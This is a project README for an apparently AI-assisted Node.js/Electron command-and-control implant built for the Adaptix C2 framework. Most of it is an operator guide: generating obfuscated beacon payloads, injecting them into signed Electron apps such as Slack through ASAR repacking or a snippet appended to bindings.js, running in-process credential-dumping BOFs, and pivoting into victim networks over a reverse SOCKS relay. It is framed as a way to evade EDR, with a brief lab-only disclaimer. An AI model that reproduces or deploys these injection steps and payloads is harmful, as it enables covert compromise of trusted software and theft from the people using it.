# YADDA

A **Node.js / Electron research implant** for [Adaptix C2](https://github.com/Adaptix-Framework/AdaptixC2) —
a JavaScript analogue of Adaptix's C++ beacon that speaks the teamserver's native wire
protocol. Instead of injecting shellcode into a process, it **script-jacks a trusted,
signed Electron application** and runs the entire implant — comms, tasking, file
operations, pivoting, even in-process BOF execution — as plain JavaScript inside the
host app's own main process.

> ⚠️ **Research / lab use only.** This is a red-team research artifact built on public
> techniques for authorized lab environments. Do not deploy against systems you do not
> own or are not explicitly authorized to test. See `DISCLAIMER.md`.

The design follows the "play a different game" thesis ([c0rnbread](https://c0rnbread.com/playing-a-different-game-rethinking-modern-defense-evasion/),
[Bobby Cooke's Loki](https://github.com/boku7/Loki)): modern EDR is optimized around
shellcode execution — injection, unbacked RWX memory, reflective loading. A JavaScript
implant living inside a legitimately signed Electron app avoids that entire telemetry
class: no new PE on disk, no process injection, no broken signatures, and the whole
payload is obfuscatable with standard JS tooling.

---

## Features

| Area | Capability |
|---|---|
| **Comms** | HTTP beacon (byte-exact Adaptix `Packer` framing, RC4 beat/task envelope), endpoint rotation/failover, optional persistent WebSocket push channel |
| **Filesystem / process** | `cd` `pwd` `ls` `cat` `rm` `mkdir` `download` (chunked) `upload` `ps list` `ps kill` — framing-exact ports of the C++ beacon's `Commander.cpp` |
| **BOF execution** | In-process COFF loader (native Node-API addon, x64 COFF objects — 32-bit BOFs rejected): MSVC *and* mingw, sync + async (native threads, timeouts, cooperative stop), streamed output, `jobs list` / `jobs kill` |
| **BOF ecosystem** | Runs public BOF packs unmodified — validated against [TrustedSec's CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) and the official Adaptix [Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit) command menu (~110 operator commands) |
| **Pivoting** | Operator-side SOCKS5 over the WebSocket relay (many sessions multiplexed on one connection) *and* the framework-native GUI tunnels (SOCKS5 / port-forward riding the beacon's own tunnel commands) |
| **Runtime JS modules** | Ship entire JavaScript capability modules to a live agent over the network and import them in-process — memory-only, nothing written to disk |
| **Payload generation** | First-class Adaptix GUI extender (`node_agent`): generate self-contained obfuscated payloads from the "Generate" dialog or REST |
| **Electron delivery** | ASAR repack + injection for unfused apps; `app.asar.unpacked` script-jack for integrity-fused apps (Slack 4.51 verified); the COFF loader addon is host-portable (one binary for `node.exe` and any Electron host) |

## Repository layout

```
src/        agent source (config, beat, packer, tasks, fsops, bof, jsmod, wslink, socks, tunnel)
native/     coffloader.c — the COFF/BOF loader addon (MSVC build) + test BOFs
scripts/    build_payload, inject_asar (+ zero-dep asar tool), ws_relay
extender/   Adaptix extender plugin (node_agent payload generation)
```

## Using it — GUI walkthrough

Everything below happens in the **AdaptixClient** GUI. (All of it is also
scriptable via the teamserver REST API, but the GUI is the intended way.)

### 0. One-time server setup

1. Build and start AdaptixC2 (teamserver + client) — see the
   [AdaptixC2 docs](https://github.com/Adaptix-Framework/AdaptixC2).
2. **Deploy this repo's payload generator** so `node_agent` appears in the GUI.
   Three one-time prerequisites, then one command:

   ```bash
   # a) build the plugin toolchain image (from your AdaptixC2 checkout — Go
   #    plugins must match the server's exact toolchain, hence the image):
   cd /path/to/AdaptixC2
   docker compose --profile build-server-ext build server-ext-builder

   # b) build the JS payload bundle this repo ships to generated agents:
   cd /path/to/YADDA && npm install && npm run build

   # c) build + install the plugin into the running teamserver, register it in
   #    profile.yaml, and restart the server:
   cd extender
   make deploy ADAPTIX_DIR=/path/to/AdaptixC2
   ```

   `make deploy` also adds the extender to the teamserver's `profile.yaml`
   automatically; to do it by hand instead, add one line to the `extenders:`
   list (e.g. `AdaptixServer/server-dist/profile.yaml`):

   ```yaml
   extenders:
     - "extenders/beacon_agent/config.yaml"
     - "extenders/gopher_agent/config.yaml"
     - "extenders/node_agent/config.yaml"     # <- this repo's generator
   ```

   After a restart the teamserver log shows the `node_agent` extender loaded
   (the dockerized server needs the deployed directory bind-mounted —
   `- ./AdaptixServer/server-dist/node_agent_ext:/app/extenders/node_agent:ro`
   in a compose override; `make deploy` targets that host dir). Whenever you
   change agent `src/`, re-run `npm run build` + `make deploy` (steps b/c) or
   generated payloads will silently use the stale bundle.
3. **Optional — BOF arsenal:** clone
   [Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit), `make` it,
   symlink it next to the server's dist and enable the axscript in `profile.yaml`:

   ```yaml
   axscripts:
     - "Extension-Kit/extension-kit.axs"
   ```

   Restart the teamserver. ~110 operator commands (`arp`, `whoami`, `dir`,
   `kerbeus klist`, `hashdump`, …) now appear in the client's console for every
   session.

### 1. Connect the client

Launch `AdaptixClient` and connect to the teamserver: URL
`https://127.0.0.1:4321/endpoint`, password from the server's `profile.yaml`
(default `pass` — change it).

### 2. Create the listener

**Listeners tab → Create Listener**, type `BeaconHTTP`:

| Field | Value | Notes |
|---|---|---|
| Name | `BeaconHTTP-8443` | anything |
| Bind Host / Port | `0.0.0.0` / `8443` | where the teamserver listens |
| Hosts | `<callback-address>:8443` | ⚠️ **must be routable from the target**, not 0.0.0.0/127.0.0.1 — the generated payloads call back to exactly this |
| Encrypt Key | 32 hex chars | RC4 key; anything you like |
| Uri / User-Agent / Parameter | `/content.html`, a browser UA, `X-Beacon-Id` | the traffic mask |

### 3. Generate the payload

**Generate** (toolbar) → select the listener → agent type **`node_agent`**. The
dialog this repo's extender contributes:

| Field | Meaning |
|---|---|
| Agent ID | `auto` (random per build) or a fixed hex id — fixed ids bake a session key so relaunches keep the same session |
| Sleep / Jitter | beacon cadence (seconds / %) |
| OS report | `none` = report the real host; pick `win10`/`win11`/… when testing on non-Windows so the server attaches the Windows command groups |
| Debug output | console.log from the payload (off for real use) |
| Interactive channel (optional) | URL + key of a `ws_relay` — enables the push channel / SOCKS5 pivot below |

Generate → you get a **single self-contained, obfuscated `.js` file** with the
listener profile baked in. No sidecar, no build step on the target.

### 4. Get it running on a target

Anywhere with Node ≥ 18 (every Electron app ships one):

```bash
node adaptix.payload.js
```

Or deliver it inside a real Electron application — see
[Delivering into Electron apps](#delivering-into-electron-apps) below (ASAR
injection for unfused apps, `app.asar.unpacked` script-jack for integrity-fused
ones like Slack). The session shows up in the GUI within one sleep cycle, with the host
app's process name (`slack.exe`, `Code.exe`, …) as the process.

### 5. Operating sessions

Select the agent → **console** (autocomplete shows everything):

```
pwd · cd · ls · cat · download · upload · rm · mkdir      # filesystem
ps list · ps kill                                          # processes
sleep <s> <jitter> · exit                                  # lifecycle
execute bof C:\path\to.x64.o            [-a for async]    # BOF execution
jobs list · jobs kill <task-id>                            # async BOF jobs
```

- **BOFs** run in-process through the COFF loader (any public pack: TrustedSec SA,
  Extension-Kit, CS-compatible `.o` files). Async BOFs (`-a`) stream output into
  the task view and live in the jobs view until they finish.
- **Extension-Kit commands** are the streamlined path — type `arp`, `whoami`,
  `dir C:\* /s`, `kerbeus klist` and the kit's binaries are packed and dispatched
  for you.
- **Pivoting:** right-click the session → create a tunnel (SOCKS5 or port-forward).
  The teamserver opens the SOCKS port; point proxychains at it and traffic egresses
  from the target. (Dockerized teamserver: publish the tunnel port in the compose
  mapping and bind `0.0.0.0`.)
- Tasks and streamed BOF output appear in the session's task list; screenshots and
  in-memory downloads land in the server's galleries/downloads.

## Delivering into Electron apps

The payload is JS — it runs *inside* a trusted, signed Electron application's main
process. Two delivery paths depending on the app's hardening:

**Unfused apps** (no ASAR-integrity fuse — screen with a fuse-wire decoder): repack
the archive; everything dynamic stays outside the asar so the payload is updatable
without repacking:

```bash
node scripts/inject_asar.js --app <path/to/resources/app.asar> --id cafe0011 \
     --host <teamserver> --port 443 --ssl --os win11
```

**Integrity-fused apps** (Slack 4.x, Discord, … reject repacks *and* same-length
content patches): script-jack a plain on-disk file under
`resources/app.asar.unpacked/` instead — those bytes carry no integrity coverage.
`node_modules/bindings/bindings.js` loads in the main process at every boot:

```js
// append to resources/app.asar.unpacked/node_modules/bindings/bindings.js
try{if(process.type==='browser'&&!globalThis.__ADPT__){globalThis.__ADPT__=1;
require(process.resourcesPath+'/adpt.payload.js')}}catch(e){}
```

with `adpt.payload.js`, `adpt.config.json` and `coffloader.node` in `resources/`.
The host app boots and works normally; the beacon runs inside the signed process,
and BOFs execute in-process with the host-portable addon.

## Advanced: operator relay (push channel, proxychains pivot, runtime JS modules)

**The relay runs on YOUR (operator) machine.** The victim's agent makes one
*outbound* WebSocket to it (egress-friendly); the relay then exposes a local SOCKS5
port **on your box** — point proxychains/curl at `127.0.0.1:11080` and every
connection is dialed by the agent from inside the victim network (reverse pivot,
all sessions multiplexed over the single reverse WS):

```
you                                             victim network
ws_relay :18765 (WS in)   ◄════ reverse WS ════  agent (outbound only)
ws_relay :11080 (SOCKS5)  ◄── proxychains4       agent dials LAN targets ──▶ 10.x/172.x
```

```bash
node scripts/ws_relay.js --port 18765 --socks 11080 --host 0.0.0.0 --key <32-hex>
# host 0.0.0.0 when the agent connects from another machine, 127.0.0.1 (default) otherwise
```

proxychains4:

```ini
# /etc/proxychains4.conf (or any path, via -f)
strict_chain
proxy_dns
[ProxyList]
socks5  127.0.0.1  11080
```

```bash
proxychains4 -f proxychains4.conf curl http://10.0.0.5:8080/
```

Domain-name requests are resolved by the agent (remote DNS). Console (agent needs `ADAPTIX_WS_URL`/`ADAPTIX_WS_KEY` or sidecar `ws` config):

```
relay> pwd | ls | cat <file> | ps | kill <pid>          # push tasking (no poll latency)
relay> js 1 + 41                                        # evaluate JS on the target
relay> load demo <module.js>                             # ship a capability module (memory-only)
relay> modules                                          # registry
relay> call demo recon                                  # invoke module exports
curl --socks5-hostname 127.0.0.1:11080 http://target/   # pivot (multiplexed over the WS)
```

`--exec "command"` (repeatable) drives the relay non-interactively (tests/CI).

## Operational notes

- **Listener `hosts` must be agent-routable** — the beacon and generated payloads
  call back to whatever the listener profile advertises (`127.0.0.1` only works
  for co-located test agents).
- **Tunnel fetch targets are dialed by the agent** — `127.0.0.1` inside a tunnel
  is the *target's* loopback, not the operator's.
- BOF conventions: WMI BOFs (tasklist) take a **wide-string** full resource path
  (`\\localhost\\root\\cimv2`); compile BOFs with `/GS-`.
- Non-Windows test hosts need the OS-report spoof (Generate dialog) or the server
  attaches no command groups to the session.

## Credits

- **[AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2)** — the C2 framework
  this agent speaks to; the wire protocol was decoded from its beacon/listener
  sources, and `native/coffloader.c` is a port of its beacon's
  `bof_loader.cpp` / `beacon_functions.cpp` / `Boffer.cpp`.
- **[Loki](https://github.com/boku7/Loki)** by Bobby Cooke (boku7) — the Node.js
  Electron script-jacking C2 that inspired this project's structure (and whose
  COFF-loader addon pattern became our `coffloader.node`).
- **[c0rnbread](https://c0rnbread.com/playing-a-different-game-rethinking-modern-defense-evasion/)** —
  "Playing a Different Game", the defense-evasion thesis this implements (pure-JS
  implant, Electron hosting, BOFs via addon, runtime module delivery).
- **[TrustedSec](https://github.com/trustedsec/CS-Situational-Awareness-BOF)** and the
  original [COFFLoader](https://github.com/trustedsec/COFFLoader) lineage — the BOF
  ecosystem used for compatibility validation.
- **[Adaptix Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit)** —
  the BOF arsenal integrated in §"Using it".
- [javascript-obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator)
  for payload obfuscation.

## License

**GPL-3.0-or-later.** This project interoperates with and derives from AdaptixC2
(GPLv3) — `native/coffloader.c` is a port of its beacon agent's BOF loader, so the
copyleft applies to this repository as a whole.

## A note on how this was made

This project was developed with heavy AI assistance. Treat it accordingly: it is
unreviewed by independent eyes, it **will** contain bugs, and corners of the
protocol and BOF ecosystems are exercised only as far as the lab testing went.
Anything you intend to rely on — especially for authorized engagements — review
the relevant code yourself and test it in your own environment first. Use at
your own risk.
